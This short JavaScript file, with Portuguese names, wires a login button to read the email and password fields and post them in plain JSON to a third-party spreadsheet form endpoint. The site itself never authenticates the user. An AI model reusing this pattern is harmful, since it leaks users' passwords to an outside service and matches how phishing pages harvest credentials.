
const botaoEntrar = document.querySelector('#botaoEntrar');

botaoEntrar.addEventListener('click', (evento) => {
    evento.preventDefault();

    const emailLogin = document.querySelector('#emailLogin').value;
    const senhaLogin = document.querySelector('#senhaLogin').value;

    fetch('https://api.sheetmonkey.io/form/tp1TjHErcc1hNrtTNiC2iD', {
    method: 'POST',
    headers: {
        'Accept': "application/json",
        'Content-type': "application/json",
    },
    body: JSON.stringify({emailLogin: emailLogin, senhaLogin: senhaLogin})
    })
})